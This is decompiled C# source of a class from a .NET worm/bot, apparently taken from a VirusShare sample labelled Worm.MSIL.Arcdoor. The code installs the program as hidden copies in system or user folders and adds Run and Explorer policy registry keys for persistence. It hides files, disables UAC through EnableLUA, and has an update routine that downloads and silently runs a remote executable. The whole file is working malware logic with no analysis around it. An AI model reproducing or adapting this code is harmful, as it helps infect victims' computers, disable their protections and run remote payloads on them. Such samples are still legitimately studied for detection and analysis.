// Decompiled with JetBrains decompiler
// Type: SysDriver.cSystem
// Assembly: SysDriver, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8A26C35F-BA28-4E81-84A7-2E70BFB0BF2E
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Worm.MSIL.Arcdoor.rd-c1c8aa0e1c017af03529dea9d73a38478f6fd04477b4a68c5889f87bb96df945.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

namespace SysDriver
{
  internal class cSystem
  {
    private Mutex yMutex;
    private cPersistent PersistentClass = new cPersistent();

    public void loadSystem()
    {
      this.createMutex();
      this.DisableProcedures();
      this.InstallBot();
      this.PersistentClass.loadPersistent();
    }

    private void createMutex()
    {
      try
      {
        this.yMutex = new Mutex(true, cMain.ConfigClass.sMutex);
        this.yMutex.ReleaseMutex();
      }
      catch
      {
        Environment.Exit(0);
      }
    }

    private void InstallBot()
    {
      string fileName = Process.GetCurrentProcess().MainModule.FileName;
      if (cMain.ConfigClass.bAdminStatus)
      {
        cMain.ConfigClass.sFilePath[0] = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\" + cMain.ConfigClass.sFileName[0];
        cMain.ConfigClass.sFilePath[1] = Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles) + "\\" + cMain.ConfigClass.sFileName[1];
      }
      else
      {
        cMain.ConfigClass.sFilePath[0] = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + cMain.ConfigClass.sFileName[0];
        cMain.ConfigClass.sFilePath[1] = Environment.GetEnvironmentVariable("TEMP") + "\\" + cMain.ConfigClass.sFileName[1];
      }
      if (this.checkInstall())
        return;
      try
      {
        foreach (string str in cMain.ConfigClass.sFilePath)
        {
          if (!cMain.FunctionClass.checkFile(str))
            System.IO.File.Copy(fileName, str);
          System.IO.File.SetAttributes(str, FileAttributes.Hidden);
        }
      }
      catch
      {
      }
      if (cMain.ConfigClass.bAdminStatus)
      {
        try
        {
          Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(cMain.ConfigClass.sRegName[0], (object) ('"'.ToString() + cMain.ConfigClass.sFilePath[0] + (object) '"'));
          Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", true).SetValue(cMain.ConfigClass.sRegName[1], (object) ('"'.ToString() + cMain.ConfigClass.sFilePath[1] + (object) '"'));
        }
        catch
        {
        }
      }
      else
      {
        try
        {
          Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(cMain.ConfigClass.sRegName[0], (object) ('"'.ToString() + cMain.ConfigClass.sFilePath[0] + (object) '"'));
          Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", true).SetValue(cMain.ConfigClass.sRegName[1], (object) ('"'.ToString() + cMain.ConfigClass.sFilePath[1] + (object) '"'));
        }
        catch
        {
        }
      }
      try
      {
        this.yMutex.Close();
        foreach (string str in cMain.ConfigClass.sFilePath)
          new Process()
          {
            StartInfo = {
              FileName = str,
              WindowStyle = ProcessWindowStyle.Hidden
            }
          }.Start();
      }
      catch
      {
      }
      Environment.Exit(0);
    }

    public void updateBot(string sFileAddress)
    {
      try
      {
        this.yMutex.Close();
      }
      catch
      {
      }
      try
      {
        string str = cMain.FunctionClass.genString(new Random().Next(5, 12)) + ".exe";
        new WebClient().DownloadFile(sFileAddress, Environment.GetEnvironmentVariable("TEMP") + "\\" + str);
        new Process()
        {
          StartInfo = {
            FileName = (Environment.GetEnvironmentVariable("TEMP") + "\\" + str),
            WindowStyle = ProcessWindowStyle.Hidden
          }
        }.Start();
      }
      catch
      {
      }
      Environment.Exit(0);
    }

    public void RemoveBot()
    {
      this.PersistentClass.stopPersistent();
      if (cMain.ConfigClass.bAdminStatus)
      {
        try
        {
          Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).DeleteValue(cMain.ConfigClass.sRegName[0]);
          Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", true).DeleteValue(cMain.ConfigClass.sRegName[1]);
        }
        catch
        {
        }
      }
      else
      {
        try
        {
          Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).DeleteValue(cMain.ConfigClass.sRegName[0]);
          Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", true).DeleteValue(cMain.ConfigClass.sRegName[1]);
        }
        catch
        {
        }
      }
      try
      {
        foreach (string path in cMain.ConfigClass.sFilePath)
          System.IO.File.Delete(path);
      }
      catch
      {
      }
      Environment.Exit(0);
    }

    private bool checkInstall()
    {
      foreach (string FilePath in cMain.ConfigClass.sFilePath)
      {
        if (!cMain.FunctionClass.checkFile(FilePath))
          return false;
      }
      return true;
    }

    private void DisableProcedures()
    {
      try
      {
        Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", true).SetValue("Hidden", (object) "2", RegistryValueKind.DWord);
      }
      catch
      {
      }
      if (!cMain.ConfigClass.bDisableUAC)
        return;
      try
      {
        Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", true).SetValue("EnableBalloonTips", (object) "0", RegistryValueKind.DWord);
      }
      catch
      {
      }
      try
      {
        Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true).SetValue("EnableLUA", (object) "0", RegistryValueKind.DWord);
        Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true).SetValue("EnableLUA", (object) "0", RegistryValueKind.DWord);
      }
      catch
      {
      }
    }
  }
}
